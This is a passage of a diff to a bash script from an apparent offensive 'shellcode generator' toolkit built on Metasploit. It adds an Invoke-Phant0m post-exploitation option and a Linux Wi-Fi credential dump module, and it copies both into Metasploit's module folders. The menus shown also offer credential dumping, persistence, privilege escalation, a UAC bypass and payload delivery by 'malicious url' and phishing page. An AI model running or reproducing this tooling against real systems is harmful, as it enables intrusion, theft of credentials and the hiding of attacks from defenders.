+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -3065,6 +3512,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3094,6 +3542,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3115,6 +3564,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.bat > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -3188,6 +3638,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -3199,7 +3650,44 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORE
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
 
 # ZIP payload files before sending? (apache2)
 rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
@@ -3250,6 +3738,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3279,6 +3768,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3298,6 +3788,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 cd $IPATH/
 }
 
@@ -3403,6 +3894,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3415,7 +3907,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -3447,10 +3939,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.vbs|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -3509,6 +4037,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3537,6 +4066,7 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3559,6 +4089,7 @@ rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.zip > /dev/null 2>&1
 rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -3694,6 +4225,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3706,7 +4238,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -3738,10 +4270,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -3782,6 +4350,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3811,6 +4380,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3877,6 +4447,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -3889,7 +4460,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -3921,10 +4492,46 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
       sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
       # reload metasploit database
       echo "[☠] copy post-module to msf db!"
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      cp enigma_fileless_uac_bypass.rb $mSf/windows/escalate/enigma_fileless_uac_bypass.rb
       echo "[☠] reloading -> Metasploit database!"
       xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
       cd $IPATH
+
+
+  elif [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+
 
   else
 
@@ -3966,6 +4573,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -3995,6 +4603,7 @@ fi
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4028,6 +4637,7 @@ rm $IPATH/output/$N4m.py > /dev/null 2>&1
 rm $IPATH/output/template.c > /dev/null 2>&1
 rm $ApAcHe/$N4m.pdf > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4105,6 +4715,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -4147,6 +4758,7 @@ if [ "$D0M4IN" = "YES" ]; then
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4176,6 +4788,7 @@ if [ "$D0M4IN" = "YES" ]; then
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4285,6 +4898,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
+         sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
@@ -4326,6 +4940,7 @@ if [ "$D0M4IN" = "YES" ]; then
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4355,6 +4970,7 @@ if [ "$D0M4IN" = "YES" ]; then
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4493,6 +5109,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4521,6 +5138,7 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4634,7 +5252,7 @@ cUe=`echo $N4m.py | cut -d '.' -f1`
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nExecute: ./$N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.py\n\nExecute: python $N4m.py\n\nchose how to deliver: $N4m.py" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
 
 
    if [ "$serv" = "multi-handler (default)" ]; then
@@ -4653,6 +5271,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           sed -i "s/\[K//g" final.log
           sed -i "s/\[1m\[31m//g" final.log
           sed -i "s/\[1m\[32m//g" final.log
+          sed -i "s/\[1m\[33m//g" final.log
           mv final.log $N4m-$lhost.log > /dev/null 2>&1
           rm report.log > /dev/null 2>&1
           cd $IPATH/
@@ -4666,7 +5285,64 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
 
 # post-exploitation
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 300) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 360) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
+      echo "[☠] Reloading msfdb database .."
+      sleep 2
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+    fi
+
+      #
+      # check if Invoke-Phantom.ps1 exists ..
+      #
+      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
+        echo "[☠] Invoke-Phant0m.ps1 found .."
+        sleep 2
+        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
+      else
+        echo "[x] Invoke-Phant0m.ps1 not found .."
+        sleep 2
+        echo "[☠] Please place module in $IPATH/aux folder .."
+        sleep 2
+        exit
+      fi
+  fi
+
+
+
+if [ "$P0" = "post_linux.rc" ]; then
+# store metasploit post exploit directory structure
+CHeK_PoSt=`cat $IPATH/settings | egrep -m 1 "POST_EXPLOIT_DIR" | cut -d '=' -f2` > /dev/null 2>&1
+  if [ -e "$CHeK_PoSt/linux/gather/wifi_dump_linux.rb" ]; then
+    echo "[✔] wifi_dump_linux.rb -> found"
+    sleep 2
+  else
+    echo "[x] wifi_dump_linux.rb -> not found"
+    sleep 1
+    echo "    copy post-module to msfdb .."
+    cp $IPATH/aux/wifi_dump_linux.rb $CHeK_PoSt/linux/gather/wifi_dump_linux.rb > /dev/null 2>&1
+    echo "[☠] Reloading msfdb database .."
+    sleep 2
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
+    xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
+  fi
+fi
+
 
 
       # edit files nedded
@@ -4702,6 +5378,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4731,6 +5408,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4750,6 +5428,7 @@ rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
 rm $ApAcHe/$N4m.py > /dev/null 2>&1
 rm $ApAcHe/index.html > /dev/null 2>&1
+rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
 sleep 2
 clear
 cd $IPATH/
@@ -4821,6 +5500,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
             sed -i "s/\[K//g" final.log
             sed -i "s/\[1m\[31m//g" final.log
             sed -i "s/\[1m\[32m//g" final.log
+            sed -i "s/\[1m\[33m//g" final.log
             mv final.log $N4m-$lhost.log > /dev/null 2>&1
             rm report.log > /dev/null 2>&1
             cd $IPATH/
@@ -4832,7 +5512,64 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" --width 305 --height 340) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_linux.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 390) > /dev/null 2>&1
+
+
+  if [ "$P0" = "Invoke-Phantom.rc" ]; then
+    #
+    # check if dependencies exist ..
+    #
+    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
+      echo "[☠] Invoke-Phant0m.rb installed .."
+      sleep 2
+    else
+      echo "[x] Invoke-Phant0m.rb not found .."
+      sleep 2
+      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
+      sleep 2
+      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
